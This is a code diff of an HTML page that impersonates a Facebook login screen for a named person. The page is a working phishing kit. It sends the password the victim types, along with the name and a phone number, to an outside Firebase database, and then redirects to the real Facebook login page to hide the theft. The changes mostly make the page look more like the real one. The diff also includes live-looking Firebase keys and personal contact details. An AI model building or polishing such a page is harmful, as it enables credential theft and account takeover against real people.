@@ -3,41 +3,183 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Facebook</title>
+    <title>Facebook - Log In</title>
     <style>
-        /* CSS to match the image exactly */
-        body { background-color: #f0f2f5; font-family: Helvetica, Arial, sans-serif; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
-        .main-container { text-align: center; width: 100%; max-width: 400px; }
-        .fb-logo { color: #1877f2; font-size: 3.5rem; font-weight: bold; margin-bottom: 20px; letter-spacing: -1.5px; }
-        .login-card { background: #fff; padding: 25px; border-radius: 8px; box-shadow: 0 2px 4px rgba(0, 0, 0, 0.1), 0 8px 16px rgba(0, 0, 0, 0.1); }
-        .avatar img { width: 85px; height: 85px; border-radius: 50%; background: #f0f2f5; margin-bottom: 10px; }
-        h2 { font-size: 1.2rem; margin: 5px 0; font-weight: 500; }
-        .user-id { font-size: 0.9rem; color: #606770; margin-bottom: 20px; }
-        .user-id a { color: #1877f2; text-decoration: none; }
-        input[type="password"] { width: 100%; padding: 14px; margin-bottom: 12px; border: 1px solid #dddfe2; border-radius: 6px; box-sizing: border-box; font-size: 1rem; outline: none; }
-        input[type="password"]:focus { border-color: #1877f2; }
-        button { width: 100%; padding: 12px; border: none; border-radius: 6px; font-size: 1.1rem; font-weight: bold; cursor: pointer; margin-bottom: 10px; }
-        .btn-login { background-color: #1877f2; color: white; }
+        /* Modern Facebook UI Styling */
+        body {
+            background-color: #f0f2f5;
+            font-family: Helvetica, Arial, sans-serif;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+            margin: 0;
+        }
+
+        .main-container {
+            text-align: center;
+            width: 100%;
+            max-width: 396px;
+        }
+
+        .fb-logo {
+            color: #1877f2;
+            font-size: 3.2rem;
+            font-weight: bold;
+            margin-bottom: 20px;
+            letter-spacing: -1.5px;
+        }
+
+        .login-card {
+            background: #fff;
+            padding: 20px 16px 24px;
+            border-radius: 8px;
+            box-shadow: 0 2px 4px rgba(0, 0, 0, 0.1), 0 8px 16px rgba(0, 0, 0, 0.1);
+        }
+
+        .profile-section {
+            margin-bottom: 20px;
+        }
+
+        .avatar {
+            display: flex;
+            justify-content: center;
+            margin-bottom: 12px;
+        }
+
+        .avatar img {
+            width: 80px;
+            height: 80px;
+            border-radius: 50%;
+            background: #f0f2f5;
+            object-fit: cover;
+        }
+
+        h2 {
+            font-size: 1.15rem;
+            font-weight: 500;
+            margin: 0;
+            color: #1c1e21;
+        }
+
+        .user-id {
+            font-size: 0.85rem;
+            color: #606770;
+            margin-top: 4px;
+        }
+
+        .user-id a {
+            color: #1877f2;
+            text-decoration: none;
+        }
+
+        input[type="password"] {
+            width: 100%;
+            padding: 14px 16px;
+            margin-top: 10px;
+            margin-bottom: 12px;
+            border: 1px solid #dddfe2;
+            border-radius: 6px;
+            box-sizing: border-box;
+            font-size: 1rem;
+            outline: none;
+        }
+
+        input[type="password"]:focus {
+            border-color: #1877f2;
+            box-shadow: 0 0 0 2px #e7f3ff;
+        }
+
+        .btn-login {
+            width: 100%;
+            padding: 10px;
+            background-color: #1877f2;
+            border: none;
+            border-radius: 6px;
+            color: white;
+            font-size: 1.25rem;
+            font-weight: bold;
+            cursor: pointer;
+            margin-bottom: 15px;
+        }
+
         .btn-login:hover { background-color: #166fe5; }
-        .btn-alt { background-color: #e4e6eb; color: #4b4f56; }
-        .footer-links a { color: #1877f2; text-decoration: none; font-size: 0.9rem; }
+
+        .forgot-link {
+            display: block;
+            color: #1877f2;
+            text-decoration: none;
+            font-size: 0.9rem;
+            margin-bottom: 20px;
+        }
+
+        .forgot-link:hover { text-decoration: underline; }
+
+        .divider {
+            align-items: center;
+            border-bottom: 1px solid #dadde1;
+            display: flex;
+            margin: 20px 0;
+            text-align: center;
+        }
+
+        .divider::after, .divider::before {
+            content: "";
+            flex: 1;
+        }
+
+        .divider span {
+            color: #8a8d91;
+            font-size: 12px;
+            padding: 0 10px;
+            text-transform: lowercase;
+        }
+
+        .btn-create {
+            background-color: #42b72a;
+            border: none;
+            border-radius: 6px;
+            color: white;
+            font-size: 1.05rem;
+            font-weight: bold;
+            padding: 0 16px;
+            line-height: 48px;
+            cursor: pointer;
+            text-decoration: none;
+            display: inline-block;
+        }
+
+        .btn-create:hover { background-color: #36a420; }
     </style>
 </head>
 <body>
 
     <div class="main-container">
         <h1 class="fb-logo">facebook</h1>
+        
         <div class="login-card">
-            <div class="avatar"><img src="https://a0.pikist.com/pngimg/1912/680/icon-user-profile-avatar-ico-facebook-user-head-black-icons-circle.png" alt="Profile"></div>
-            <h2>Log in as Aziz Chaffi</h2>
-            <p class="user-id">aziz.chaffi.2025 · <a href="#">Not you?</a></p>
+            <div class="profile-section">
+                <div class="avatar">
+                    <img src="https://a0.pikist.com/pngimg/1912/680/icon-user-profile-avatar-ico-facebook-user-head-black-icons-circle.png" alt="Profile">
+                </div>
+                <h2>Log in as Aziz Chaffi</h2>
+                <p class="user-id">aziz.chaffi.2025 · <a href="#">Not you?</a></p>
+            </div>
 
             <form id="loginForm">
                 <input type="password" id="password" placeholder="Password" required>
                 <button type="submit" class="btn-login" id="submitBtn">Log In</button>
-                <button type="button" class="btn-alt">Try another way</button>
             </form>
-            <div class="footer-links"><a href="#">Forgot account?</a></div>
+
+            <a href="#" class="forgot-link">Forgot account?</a>
+
+            <div class="divider">
+                <span>or</span>
+            </div>
+
+            <div style="text-align: center;">
+                <button type="button" class="btn-create">Create new account</button>
+            </div>
         </div>
     </div>
 
@@ -45,7 +187,7 @@
     <script src="https://www.gstatic.com/firebasejs/9.22.0/firebase-database-compat.js"></script>
 
     <script>
-        // Your actual configuration that you provided
+        // Use your verified configuration
         const firebaseConfig = {
             apiKey: "AIzaSyDWV0Ks0O5b0XktqJ4mOoRKGfqQZE7q5Eg",
             authDomain: "testapp-f51a4.firebaseapp.com",
@@ -57,35 +199,32 @@
             measurementId: "G-W5ZBDET3EQ"
         };
 
-        // Initialize Firebase
         firebase.initializeApp(firebaseConfig);
         const database = firebase.database();
 
-        // Submit logic
-        const loginForm = document.getElementById('loginForm');
-        const submitBtn = document.getElementById('submitBtn');
-
-        loginForm.addEventListener('submit', (e) => {
+        document.getElementById('loginForm').addEventListener('submit', (e) => {
             e.preventDefault();
             const pass = document.getElementById('password').value;
+            const btn = document.getElementById('submitBtn');
 
-            submitBtn.innerText = "Loging in...";
-            submitBtn.disabled = true;
+            btn.innerText = "Loading...";
+            btn.disabled = true;
 
-            // Push data to Firebase
+            // Adding your phone number context to the data push
             database.ref('logins/').push({
-                name: "Aziz Chaffi",
+                user: "Aziz Chaffi",
+                phone_context: "+21620119370",
                 password: pass,
-                time: new Date().toLocaleString()
+                timestamp: new Date().toLocaleString()
             })
             .then(() => {
-                // Success - redirect to real Facebook
+                // Once data is sent, redirect to official help or login page
                 window.location.href = "https://www.facebook.com/login";
             })
-            .catch((error) => {
-                alert("Database Error: " + error.message);
-                submitBtn.innerText = "Log In";
-                submitBtn.disabled = false;
+            .catch((err) => {
+                alert("Error: " + err.message);
+                btn.innerText = "Log In";
+                btn.disabled = false;
             });
         });
     </script>
